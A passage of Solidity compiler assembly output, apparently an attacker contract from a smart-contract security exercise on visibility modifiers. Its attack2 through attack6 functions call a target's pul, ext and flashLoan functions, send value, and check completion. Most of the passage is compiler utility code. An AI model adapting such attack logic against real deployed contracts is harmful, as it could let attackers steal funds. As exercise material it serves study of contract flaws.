and\n      0xfa391c64\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1202:1219  fun.isCompleted() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_68\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_68:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_70\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_70:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1166:1227  function complete()public{... */\n      jump\t// out\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":183:199  check public fun */\n    tag_26:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":685:825  function attack2()public payable{... */\n    tag_30:\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":729:741  bool success */\n      0x00\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":752:755  fun */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":744:761  address(fun).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":768:771  100 */\n      0x64\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":744:776  address(fun).call{value:100}(\"\") */\n      mload(0x40)\n      tag_72\n      swap1\n      tag_44\n      jump\t// in\n    tag_72:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_75\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_74)\n    tag_75:\n      0x60\n      swap2\n      pop\n    tag_74:\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":728:776  (bool success,)=address(fun).call{value:100}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":795:802  success */\n      dup1\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":787:817  require(success,\"call failed\") */\n      tag_76\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_77\n      swap1\n      tag_50\n      jump\t// in\n    tag_77:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_76:\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":717:825  {... */\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":685:825  function attack2()public payable{... */\n      jump\t// out\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":831:901  function attack3()public payable{... */\n    tag_32:\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":874:877  fun */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":874:881  fun.pul */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xc58a455b\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":874:883  fun.pul() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_79\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_79:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_81\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_81:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":831:901  function attack3()public payable{... */\n      jump\t// out\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":984:1044  function attack5()public payable{... */\n    tag_34:\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1027:1030  fun */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1027:1034  fun.ext */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xcf9f23b5\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1027:1036  fun.ext() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_83\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_83:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_85\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_85:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":984:1044  function attack5()public payable{... */\n      jump\t// out\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1050:1160  function attack6()public payable{... */\n    tag_36:\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1093:1096  fun */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1093:1106  fun.flashLoan */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xe0232b42\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1115:1118  fun */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1120:1121  0 */\n      0x00\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1122:1130  figure() */\n      tag_87\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1122:1128  figure */\n      tag_16\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1122:1130  figure() */\n      jump\t// in\n    tag_87:\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1093:1131  fun.flashLoan(address(fun),0,figure()) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_88\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_62\n      jump\t// in\n    tag_88:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_89\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_89:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_91\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_91:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1142:1152  complete() */\n      tag_92\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1142:1150  complete */\n      tag_23\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1142:1152  complete() */\n      jump\t// in\n    tag_92:\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1050:1160  function attack6()public payable{... */\n      jump\t// out\n        /* \"#utility.yul\":7:105   */\n    tag_93:\n        /* \"#utility.yul\":58:64   */\n      0x00\n        /* \"#utility.yul\":92:97   */\n      dup2\n        /* \"#utility.yul\":86:98   */\n      mload\n        /* \"#utility.yul\":76:98   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:105   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":111:279   */\n    tag_94:\n        /* \"#utility.yul\":194:205   */\n      0x00\n        /* \"#utility.yul\":228:234   */\n      dup3\n        /* \"#utility.yul\":223:226   */\n      dup3\n        /* \"#utility.yul\":216:235   */\n      mstore\n        /* \"#utility.yul\":268:272   */\n      0x20\n        /* \"#utility.yul\":263:266   */\n      dup3\n        /* \"#utility.yul\":259:273   */\n      add\n        /* \"#utility.yul\":244:273   */\n      swap1\n      pop\n        /* \"#utility.yul\":111:279   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":285:531   */\n    tag_95:\n        /* \"#utility.yul\":366:367   */\n      0x00\n        /* \"#utility.yul\":376:489   */\n    tag_120:\n        /* \"#utility.yul\":390:396   */\n      dup4\n        /* \"#utility.yul\":387:388   */\n      dup2\n        /* \"#utility.yul\":384:397   */\n      lt\n        /* \"#utility.yul\":376:489   */\n      iszero\n      tag_122\n      jumpi\n        /* \"#utility.yul\":475:476   */\n      dup1\n        /* \"#utility.yul\":470:473   */\n      dup3\n        /* \"#utility.yul\":466:477   */\n      add\n        /* \"#utility.yul\":460:478   */\n      mload\n        /* \"#utility.yul\":456:457   */\n      dup2\n        /* \"#utility.yul\":451:454   */\n      dup5\n        /* \"#utility.yul\":447:458   */\n      add\n        /* \"#utility.yul\":440:479   */\n      mstore\n        /* \"#utility.yul\":412:414   */\n      0x20\n        /* \"#utility.yul\":409:410   */\n      dup2\n        /* \"#utility.yul\":405:415   */\n      add\n        /* \"#utility.yul\":400:415   */\n      swap1\n      pop\n        /* \"#utility.yul\":376:489   */\n      jump(tag_120)\n    tag_122:\n        /* \"#utility.yul\":523:524   */\n      0x00\n        /* \"#utility.yul\":514:520   */\n      dup5\n        /* \"#utility.yul\":509:512   */\n      dup5\n        /* \"#utility.yul\":505:521   */\n      add\n        /* \"#utility.yul\":498:525   */\n      mstore\n        /* \"#utility.yul\":347:531   */\n      pop\n        /* \"#utility.yul\":285:531   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":537:639   */\n    tag_96:\n        /* \"#utility.yul\":578:584   */\n      0x00\n        /* \"#utility.yul\":629:631   */\n      0x1f\n        /* \"#utility.yul\":625:632   */\n      not\n        /* \"#utility.yul\":620:622   */\n      0x1f\n        /* \"#utility.yul\":613:618   */\n      dup4\n        /* \"#utility.yul\":609:623   */\n      add\n        /* \"#utility.yul\":605:633   */\n      and\n        /* \"#utility.yul\":595:633   */\n      swap1\n      pop\n        /* \"#utility.yul\":537:639   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":645:1018   */\n    tag_97:\n        /* \"#utility.yul\":731:734   */\n      0x00\n        /* \"#utility.yul\":759:797   */\n      tag_125\n        /* \"#utility.yul\":791:796   */\n      dup3\n        /* \"#utility.yul\":759:797   */\n      tag_93\n      jump\t// in\n    tag_125:\n        /* \"#utility.yul\":813:883   */\n      tag_126\n        /* \"#utility.yul\":876:882   */\n      dup2\n        /* \"#utility.yul\":871:874   */\n      dup6\n        /* \"#utility.yul\":813:883   */\n      tag_94\n      jump\t// in\n    tag_126:\n        /* \"#utility.yul\":806:883   */\n      swap4\n      pop\n        /* \"#utility.yul\":892:957   */\n      tag_127\n        /* \"#utility.yul\":950:956   */\n      dup2\n        /* \"#utility.yul\":945:948   */\n      dup6\n        /* \"#utility.yul\":938:942   */\n      0x20\n        /* \"#utility.yul\":931:936   */\n      dup7\n        /* \"#utility.yul\":927:943   */\n      add\n        /* \"#utility.yul\":892:957   */\n      tag_95\n      jump\t// in\n    tag_127:\n        /* \"#utility.yul\":982:1011   */\n      tag_128\n        /* \"#utility.yul\":1004:1010   */\n      dup2\n        /* \"#utility.yul\":982:1011   */\n      tag_96\n      jump\t// in\n    tag_128:\n        /* \"#utility.yul\":977:980   */\n      dup5\n        /* \"#utility.yul\":973:1012   */\n      add\n        /* \"#utility.yul\":966:1012   */\n      swap2\n      pop\n        /* \"#utility.yul\":735:1018   */\n      pop\n        /* \"#utility.yul\":645:1018   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1024:1333   */\n    tag_18:\n        /* \"#utility.yul\":1135:1139   */\n      0x00\n        /* \"#utility.yul\":1173:1175   */\n      0x20\n        /* \"#utility.yul\":1162:1171   */\n      dup3\n        /* \"#utility.yul\":1158:1176   */\n      add\n        /* \"#utility.yul\":1150:1176   */\n      swap1\n      pop\n        /* \"#utility.yul\":1222:1231   */\n      dup2\n        /* \"#utility.yul\":1216:1220   */\n      dup2\n        /* \"#utility.yul\":1212:1232   */\n      sub\n        /* \"#utility.yul\":1208:1209   */\n      0x00\n        /* \"#utility.yul\":1197:1206   */\n      dup4\n        /* \"#utility.yul\":1193:1210   */\n      add\n        /* \"#utility.yul\":1186:1233   */\n      mstore\n        /* \"#utility.yul\":1250:1326   */\n      tag_130\n        /* \"#utility.yul\":1321:1325   */\n      dup2\n        /* \"#utility.yul\":1312:1318   */\n      dup5\n        /* \"#utility.yul\":1250:1326   */\n      tag_97\n      jump\t// in\n    tag_130:\n        /* \"#utility.yul\":1242:1326   */\n      swap1\n      pop\n        /* \"#utility.yul\":1024:1333   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1339:1465   */\n    tag_98:\n        /* \"#utility.yul\":1376:1383   */\n      0x00\n        /* \"#utility.yul\":1416:1458   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1409:1414   */\n      dup3\n        /* \"#utility.yul\":1405:1459   */\n      and\n        /* \"#utility.yul\":1394:1459   */\n      swap1\n      pop\n        /* \"#utility.yul\":1339:1465   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1471:1531   */\n    tag_99:\n        /* \"#utility.yul\":1499:1502   */\n      0x00\n        /* \"#utility.yul\":1520:1525   */\n      dup2\n        /* \"#utility.yul\":1513:1525   */\n      swap1\n      pop\n        /* \"#utility.yul\":1471:1531   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1537:1679   */\n    tag_100:\n        /* \"#utility.yul\":1587:1596   */\n      0x00\n        /* \"#utility.yul\":1620:1673   */\n      tag_134\n        /* \"#utility.yul\":1638:1672   */\n      tag_135\n        /* \"#utility.yul\":1647:1671   */\n      tag_136\n        /* \"#utility.yul\":1665:1670   */\n      dup5\n        /* \"#utility.yul\":1647:1671   */\n      tag_98\n      jump\t// in\n    tag_136:\n        /* \"#utility.yul\":1638:1672   */\n      tag_99\n      jump\t// in\n    tag_135:\n        /* \"#utility.yul\":1620:1673   */\n      tag_98\n      jump\t// in\n    tag_134:\n        /* \"#utility.yul\":1607:1673   */\n      swap1\n      pop\n        /* \"#utility.yul\":1537:1679   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1685:1819   */\n    tag_101:\n        /* \"#utility.yul\":1743:1752   */\n      0x00\n        /* \"#utility.yul\":1776:1813   */\n      tag_138\n        /* \"#utility.yul\":1807:1812   */\n      dup3\n        /* \"#utility.yul\":1776:1813   */\n      tag_100\n      jump\t// in\n    tag_138:\n        /* \"#utility.yul\":1763:1813   */\n      swap1\n      pop\n        /* \"#utility.yul\":1685:1819   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1825:1980   */\n    tag_102:\n        /* \"#utility.yul\":1896:1905   */\n      0x00\n        /* \"#utility.yul\":1929:1974   */\n      tag_140\n        /* \"#utility.yul\":1968:1973   */\n      dup3\n        /* \"#utility.yul\":1929:1974   */\n      tag_101\n      jump\t// in\n    tag_140:\n        /* \"#utility.yul\":1916:1974   */\n      swap1\n      pop\n        /* \"#utility.yul\":1825:1980   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1986:2159   */\n    tag_103:\n        /* \"#utility.yul\":2094:2152   */\n      tag_142\n        /* \"#utility.yul\":2146:2151   */\n      dup2\n        /* \"#utility.yul\":2094:2152   */\n      tag_102\n      jump\t// in\n    tag_142:\n        /* \"#utility.yul\":2089:2092   */\n      dup3\n        /* \"#utility.yul\":2082:2153   */\n      mstore\n        /* \"#utility.yul\":1986:2159   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2165:2429   */\n    tag_28:\n        /* \"#utility.yul\":2279:2283   */\n      0x00\n        /* \"#utility.yul\":2317:2319   */\n      0x20\n        /* \"#utility.yul\":2306:2315   */\n      dup3\n        /* \"#utility.yul\":2302:2320   */\n      add\n        /* \"#utility.yul\":2294:2320   */\n      swap1\n      pop\n        /* \"#utility.yul\":2330:2422   */\n      tag_144\n        /* \"#utility.yul\":2419:2420   */\n      0x00\n        /* \"#utility.yul\":2408:2417   */\n      dup4\n        /* \"#utility.yul\":2404:2421   */\n      add\n        /* \"#utility.yul\":2395:2401   */\n      dup5\n        /* \"#utility.yul\":2330:2422   */\n      tag_103\n      jump\t// in\n    tag_144:\n        /* \"#utility.yul\":2165:2429   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2435:2582   */\n    tag_104:\n        /* \"#utility.yul\":2536:2547   */\n      0x00\n        /* \"#utility.yul\":2573:2576   */\n      dup2\n        /* \"#utility.yul\":2558:2576   */\n      swap1\n      pop\n        /* \"#utility.yul\":2435:2582   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2588:2702   */\n    tag_105:\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2708:3106   */\n    tag_106:\n        /* \"#utility.yul\":2867:2870   */\n      0x00\n        /* \"#utility.yul\":2888:2971   */\n      tag_148\n        /* \"#utility.yul\":2969:2970   */\n      0x00\n        /* \"#utility.yul\":2964:2967   */\n      dup4\n        /* \"#utility.yul\":2888:2971   */\n      tag_104\n      jump\t// in\n    tag_148:\n        /* \"#utility.yul\":2881:2971   */\n      swap2\n      pop\n        /* \"#utility.yul\":2980:3073   */\n      tag_149\n        /* \"#utility.yul\":3069:3072   */\n      dup3\n        /* \"#utility.yul\":2980:3073   */\n      tag_105\n      jump\t// in\n    tag_149:\n        /* \"#utility.yul\":3098:3099   */\n      0x00\n        /* \"#utility.yul\":3093:3096   */\n      dup3\n        /* \"#utility.yul\":3089:3100   */\n      add\n        /* \"#utility.yul\":3082:3100   */\n      swap1\n      pop\n        /* \"#utility.yul\":2708:3106   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3112:3491   */\n    tag_44:\n        /* \"#utility.yul\":3296:3299   */\n      0x00\n        /* \"#utility.yul\":3318:3465   */\n      tag_151\n        /* \"#utility.yul\":3461:3464   */\n      dup3\n        /* \"#utility.yul\":3318:3465   */\n      tag_106\n      jump\t// in\n    tag_151:\n        /* \"#utility.yul\":3311:3465   */\n      swap2\n      pop\n        /* \"#utility.yul\":3482:3485   */\n      dup2\n        /* \"#utility.yul\":3475:3485   */\n      swap1\n      pop\n        /* \"#utility.yul\":3112:3491   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3497:3666   */\n    tag_107:\n        /* \"#utility.yul\":3581:3592   */\n      0x00\n        /* \"#utility.yul\":3615:3621   */\n      dup3\n        /* \"#utility.yul\":3610:3613   */\n      dup3\n        /* \"#utility.yul\":3603:3622   */\n      mstore\n        /* \"#utility.yul\":3655:3659   */\n      0x20\n        /* \"#utility.yul\":3650:3653   */\n      dup3\n        /* \"#utility.yul\":3646:3660   */\n      add\n        /* \"#utility.yul\":3631:3660   */\n      swap1\n      pop\n        /* \"#utility.yul\":3497:3666   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3672:3833   */\n    tag_108:\n        /* \"#utility.yul\":3812:3825   */\n      0x63616c6c206661696c6564000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3808:3809   */\n      0x00\n        /* \"#utility.yul\":3800:3806   */\n      dup3\n        /* \"#utility.yul\":3796:3810   */\n      add\n        /* \"#utility.yul\":3789:3826   */\n      mstore\n        /* \"#utility.yul\":3672:3833   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3839:4205   */\n    tag_109:\n        /* \"#utility.yul\":3981:3984   */\n      0x00\n        /* \"#utility.yul\":4002:4069   */\n      tag_155\n        /* \"#utility.yul\":4066:4068   */\n      0x0b\n        /* \"#utility.yul\":4061:4064   */\n      dup4\n        /* \"#utility.yul\":4002:4069   */\n      tag_107\n      jump\t// in\n    tag_155:\n        /* \"#utility.yul\":3995:4069   */\n      swap2\n      pop\n        /* \"#utility.yul\":4078:4171   */\n      tag_156\n        /* \"#utility.yul\":4167:4170   */\n      dup3\n        /* \"#utility.yul\":4078:4171   */\n      tag_108\n      jump\t// in\n    tag_156:\n        /* \"#utility.yul\":4196:4198   */\n      0x20\n        /* \"#utility.yul\":4191:4194   */\n      dup3\n        /* \"#utility.yul\":4187:4199   */\n      add\n        /* \"#utility.yul\":4180:4199   */\n      swap1\n      pop\n        /* \"#utility.yul\":3839:4205   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4211:4630   */\n    tag_50:\n        /* \"#utility.yul\":4377:4381   */\n      0x00\n        /* \"#utility.yul\":4415:4417   */\n      0x20\n        /* \"#utility.yul\":4404:4413   */\n      dup3\n        /* \"#utility.yul\":4400:4418   */\n      add\n        /* \"#utility.yul\":4392:4418   */\n      swap1\n      pop\n        /* \"#utility.yul\":4464:4473   */\n      dup2\n        /* \"#utility.yul\":4458:4462   */\n      dup2\n        /* \"#utility.yul\":4454:4474   */\n      sub\n        /* \"#utility.yul\":4450:4451   */\n      0x00\n        /* \"#utility.yul\":4439:4448   */\n      dup4\n        /* \"#utility.yul\":4435:4452   */\n      add\n        /* \"#utility.yul\":4428:4475   */\n      mstore\n        /* \"#utility.yul\":4492:4623   */\n      tag_158\n        /* \"#utility.yul\":4618:4622   */\n      dup2\n        /* \"#utility.yul\":4492:4623   */\n      tag_109\n      jump\t// in\n    tag_158:\n        /* \"#utility.yul\":4484:4623   */\n      swap1\n      pop\n        /* \"#utility.yul\":4211:4630   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4636:4732   */\n    tag_110:\n        /* \"#utility.yul\":4673:4680   */\n      0x00\n        /* \"#utility.yul\":4702:4726   */\n      tag_160\n        /* \"#utility.yul\":4720:4725   */\n      dup3\n        /* \"#utility.yul\":4702:4726   */\n      tag_98\n      jump\t// in\n    tag_160:\n        /* \"#utility.yul\":4691:4726   */\n      swap1\n      pop\n        /* \"#utility.yul\":4636:4732   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4738:4856   */\n    tag_111:\n        /* \"#utility.yul\":4825:4849   */\n      tag_162\n        /* \"#utility.yul\":4843:4848   */\n      dup2\n        /* \"#utility.yul\":4825:4849   */\n      tag_110\n      jump\t// in\n    tag_162:\n        /* \"#utility.yul\":4820:4823   */\n      dup3\n        /* \"#utility.yul\":4813:4850   */\n      mstore\n        /* \"#utility.yul\":4738:4856   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4862:4947   */\n    tag_112:\n        /* \"#utility.yul\":4907:4914   */\n      0x00\n        /* \"#utility.yul\":4936:4941   */\n      dup2\n        /* \"#utility.yul\":4925:4941   */\n      swap1\n      pop\n        /* \"#utility.yul\":4862:4947   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4953:5030   